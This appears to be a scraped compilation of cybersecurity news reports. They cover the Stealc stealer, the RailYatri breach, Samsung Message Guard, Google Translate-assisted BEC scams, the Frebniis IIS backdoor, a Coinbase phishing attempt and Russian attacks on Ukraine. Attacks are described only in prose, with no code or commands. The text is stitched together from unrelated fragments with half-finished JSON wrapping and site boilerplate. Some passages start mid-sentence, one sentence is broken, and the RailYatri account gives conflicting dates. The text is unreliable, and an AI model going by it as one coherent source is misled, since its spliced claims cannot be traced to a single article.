Once this step is over, the malware removes itself and the downloaded DLL files from the compromised host to wipe the traces of the infection.One distribution method the researchers observed is via YouTube videos describing how to install cracked software and linking to a download website.The researchers say that the software download embeds the Stealc info stealer. Once the installer is executed, the malware begins its routine and communicates with its server.Considering the observed distribution method, users are recommended to steer away from installing pirated software and download products only from the official developer's website."

      "text": " Although the RailYatri attack occurred in December 2022, the stolen data was only recently made public on a well-known hacker forum. In addition to exposing personal information, the RailYatri hack revealed the locations of millions of travelers throughout India.Email addresses, complete names, genders, phone numbers, and locations are among the data that has been hacked, putting millions of people at risk of identity theft, phishing scams, and other online crimes.A hacker and criminal site called Breachforums emerged as a rival to the well-known and now-seized Raidforums and can confirm that the database has been exposed there.Sen informed RailYatri of the problem and pointed out that the server belonged to them; at first, they disputed ownership. Later, the business said it was just test data. The server had about 37 million entries in total, including internal production logs and over 700,000 logs at that time.Only when the Indian Computer Emergency Response Team (CERT-In) intervened in 2020 was Railyatri able to safeguard its data; two years later, on February 16, 2023, hackers shook the business with yet another security breach because of a new leak.“Back in 2020, when I contacted Railyatri, they never reacted or reached out to me, but once I contacted Cert-In, the server got shut down.” Anurag continued, “I have reported numerous data leaks in India; the main problem I observed is that these corporations are not receiving fines because India does not have a GDPR-like statute.According to Anurag, the most recent data leak could have been prevented “if the organization had put in place suitable cybersecurity procedures from the beginning.”It is recommended that all users change their passwords frequently and turn on two-factor authentication for added security. Users have also been encouraged to keep an eye on their credit card and bank statements for any strange activity.A threat actor posing as RailYatri on BreachForums released a database of more than 30 million users on February 16. With the most recent hack at the e-booking services website RailYatri, Indian Railways’ cybersecurity practices are once again being questioned.Concern and criticism are flying after it was discovered that over 30 million user records connected to the train ticketing platform were being traded on the dark web. According to the post, the Indian Railway Catering and Tourism Corporation (IRCTC)-approved travel booking app experienced a data breach in December of last year, during which the personal information of 31 million users was stolen.2020 Cybersecurity Landscape: 100+ Experts’ PredictionsCyber Security Predictions 2021: Experts’ ResponsesExperts’ Responses: Cyber Security Predictions 2023Celebrating Data Privacy Day – 28th January 2023Data Privacy Protection Day (Thursday 28th) – Experts Comments“Cybersecurity Awareness Month’s new evergreen theme \"Secure Our World” is…“Avoid storing data on personal devices: A crucial but often overlooked…“I recommend a new nuance to passwords that isn’t often…“In my role overseeing cloud environments and incident response, I'm…“​​Cybersecurity Awareness Month serves as a reminder to confront the…Information Security Buzz (aka ISBuzz News) is an independent resource that provides the experts comments, analysis and opinion on the latest Information Security news and topics "

      "text": " Freelance JournalistSamsung has released a new smartphone feature designed to protect user devices from threats disguised as image attachments.Called “Message Guard,” the new capability is currently compatible with the Samsung Messages app as well as with Messages by Google.From a technical standpoint, Message Guard acts as an advanced sandbox layer that isolates image files from the rest of the device.“This prevents malicious code from accessing your phone’s files or interacting with its operating system,” the company explained. “Samsung Message Guard checks the file bit by bit and processes it in a controlled environment to ensure it cannot infect the rest of your device.”If the file is deemed harmless, it is then allowed to be accessed normally by the user. If not, it is disposed of.“Samsung Message Guard automatically neutralizes any potential threat hiding in image files before they have a chance to do you any harm. It also runs silently and largely invisibly in the background and does not need to be activated by the user,” the company wrote.“So where previously you could be endangered without doing anything, now you are protected from zero-click exploits without lifting a finger.”The Samsung Message Guard feature is currently being rolled out on Galaxy S23 series devices. The company confirmed it would bring the new feature to other smartphones and tablets supporting One UI 5.1 or higher later this year."

      "text": " BEC attacks entail posing as a senior executive or business partner and convincing a corporate target to wire large quantities of cash to a bank account under the attacker's control. Successfully launching the international variant of this cyberattack generally requires a lot of time and effort. The target must be sufficiently researched to make phishing lures plausible. Moreover, native speakers must be hired to translate frauds into other languages. Yet this is all changing as threat actors use free online technologies that reduce some of the need for manual work. Midnight Hedgehog and Mandarin Capybara are two BEC groups that best represent the trend, according to a research from Abnormal Security published this week. Both use Google Translate, which enables threat actors to quickly create convincing phishing lures in practically any language. Moreover, researchers in the study also cautioned that tools such as commercial business marketing services are aiding the success of less-resourced and less-sophisticated BEC attacks. They are mostly used by sales and marketing teams to find \"leads,\" making it simple to locate the best targets regardless of their region. The fact that BEC attacks are already lucrative, causing $2.4 billion in damages in 2021 alone, according to the FBI's Crime Report, and the number of BEC attacks is constantly increasing, is bad news for defenders. Volumes are now likely to increase as some of the cost associated with performing them has been eliminated. Crane Hassold, director of threat intelligence of Abnormal Security in a report noted that Midnight Hedgehog has been since January 2021 and specialises in impersonating CEOs. Danish, Dutch, Estonian, French, German, Hungarian, Italian, Norwegian, Polish, Spanish, and Swedish are among the 11 languages that the company has so far identified in two significant phishing emails from the organization. The emails are lacking the simple mistakes that consumers are conditioned to look out for and regard as suspicious thanks to Google Translate's effectiveness. \"We've taught our users to look for spelling mistakes and grammatical errors to better identify when they may have received an attack[…]When these are not present, there are fewer alarm bells to alert native speakers that something isn't right,\" the report said. Apparently, Midnight Hedgehog has requested payments ranging from $17,000 to $45,000. Mandarin Capybara, the second BEC threat organization mentioned in the report, sends emails posing as communications from business executives but with a twist: Paychecks are transferred to a controlled account via direct deposit by contacting payroll. Abnormal Security has noted that Mandarin Capybara targets businesses all over the world with phishing lures in Dutch, English, French, German, Italian, Polish, Portuguese, Spanish, and Swedish. However, unlike Midnight Hedgehog, which the report claimed sticks to non-English-speaking victims in Europe, Mandarin Capybara also targets businesses outside of Europe with phishing emails aimed at English speakers in the US and Australia. In some instances, they utilized the same tactics of fraudulent email accounts to distribute emails in multiple languages.The reason why BEC campaigns are still in trend among threat actors is simply how they operate, where their victims receive these messages, deeming them legitimate, and act upon instructions they think are coming from their ‘boss,’ especially when the emails are written with correct grammar and spelling and the sender's signature style. \"As email marketing and translation tools become more accurate, effective, and accessible, we'll likely continue to see hackers exploiting them to scam companies with increasing success,\" said Hassold. It is that organizations put procedures in place to make sure that large financial transactions are not approved by only one person and that people should be trained to be on the lookout for payment fraud attacks in addition to deploying appropriate cybersecurity tools to help catch BEC attacks. \"It's important that organizations use email defenses that look for threats in a more holistic matter to be able to prevent more sophisticated BEC attacks. Defenses that simply rely on static or 'known bad' indicators will have a hard time detecting these attacks, which is why tools that leverage behavioral analytics are better equipped to spot more advanced BEC threats,\" concludes Hassold.    your nameYour Emailyour message"

      "text": " Freelance JournalistCybersecurity researchers have discovered a new malware that leverages a legitimate feature of Microsoft’s Internet Information Services (IIS) to install a backdoor in targeted systems.“The technique used by Frebniis involves injecting malicious code into the memory of a [dynamic link library] DLL file [...] related to an IIS feature used to troubleshoot and analyze failed web page requests,” reads the technical write-up.At a basic level, IIS is a web server running on Windows systems to serve requested HTML pages or files. These servers can accept requests from remote client computers and then return the appropriate response.According to the security researchers, exploiting this tool enabled the malware to stealthily monitor all HTTP requests while also automatically recognizing specially formatted HTTP requests sent by the attacker.“These requests allow remote code execution [RCE] and proxying to internal systems in a stealthy manner,” reads the advisory. “No files or suspicious processes will be running on the system, making Frebniis a relatively unique and rare type of HTTP backdoor seen in the wild.”The Symantec team clarified that to use this technique, an attacker would need to gain access to the Windows system running the IIS server by some other means. In the attack described in the advisory, the security researchers wrote that it was unclear how this access was achieved."

After entering their credentials, they were thanked and prompted to disregard the message.In the next phase, the attacker tried to log into Coinbase's internal systems using the stolen credential but failed because access was protected with multi-factor authentication (MFA).Roughly 20 minutes later, the attacker moved to another strategy. They called the employee claiming to be from the Coinbase IT team and directed the victim to log into their workstation and follow some instructions.Coinbase's CSIRT detected the unusual activity within 10 minutes since the start of the attack and contacted the victim to inquire about unusual recent activities from their account. The employee then realized something was wrong and terminated communications with the attacker.Coinbase has shared some of the observed TTPs that other companies could use to identify a similar attack and defend against it: According to cybersecurity company Group-IB, the threat actor stole almost 1,000 corporate access logins by sending phishing links over SMS to company employees.Employees of companies that manage digital assets and have a strong online presence are bound to be targeted by social engineering actors at some point.Adopting a multi-layered defense can make an attack sufficiently challenging for most threat actors to give up.

      "text": " Samsung has developed a new security system called Samsung Message Guard to help Galaxy smartphone users keep safe from the so-called “zero-click” exploits that use malicious image files.The Korean tech giant says its new security system will be able to detect these threats when they reach the device as a message and to stop them before they do any damage.Zero-click exploits are sophisticated threats that leverage a vulnerability without requiring any interaction with the user.Typically, attacks relying on zero-click exploits involve sending the target a message or file with malicious code to trigger a vulnerability on the device that gives the attacker access without the victim even opening the message or file.Samsung Message Guard is an isolated virtual space on the smartphone that acts as a temporary hosting location for newly arrived image files in PNG, JPG/JPEG, GIF, ICO, WEBP, BMP, and WBMP formats.The system checks the files to determine if they hide malicious code. If so, they are locked in quarantine mode and blocked from accessing or interacting with the underlying operating system.“It also runs silently and largely invisibly in the background and does not need to be activated by the user” - SamsungThe new security system is added to Samsung’s multiple existing protection layers, most notably Samsung Knox, which can offer real-time threat detection and protection against malware.Samsung Message Guard is available immediately for Galaxy S23, released on Friday, and it will gradually roll out to other Galaxy devices running One UI 5.1 or higher later in 2023."

      "text": " Russia's cyber attacks against Ukraine surged by 250% in 2022 when compared to two years ago, Google's Threat Analysis Group (TAG) and Mandiant disclosed in a new joint report.As many as six unique wiper strains – including WhisperGate, HermeticWiper, IsaacWiper, CaddyWiper, Industroyer2, and SDelete – have been deployed against Ukrainian networks, suggesting a willingness on the part of Russian threat actors to forgo persistent access.\"Russian government-backed attackers have engaged in an aggressive, multi-pronged effort to gain a decisive wartime advantage in cyberspace, often with mixed results,\" TAG's Shane Huntley noted.The uptick in the intensity and frequency of the operations aside, the invasion has also been accompanied by the Kremlin engaging in covert and overt information operations designed to shape public perception with the goal of undermining the Ukrainian government, fracturing international support for Ukraine, and maintaining domestic support for Russia.\"GRU-sponsored actors have used their access to steal sensitive information and release it to the public to further a narrative, or use that same access to conduct destructive cyber attacks or information operations campaigns,\" the tech giant said.\"It is clear cyber will continue to play an integral role in future armed conflict, supplementing traditional forms of warfare,\" Huntley said.\"Despite Russia's conventional military setbacks and its failure to substantively advance its agenda through cyber operations, Russia maintains its intent to bring Ukraine under Russian control,\" it added, while also highlighting its \"burgeoning military cooperation with Iran and North Korea.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation to learn how to combat Zenbleed and Kubernetes attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
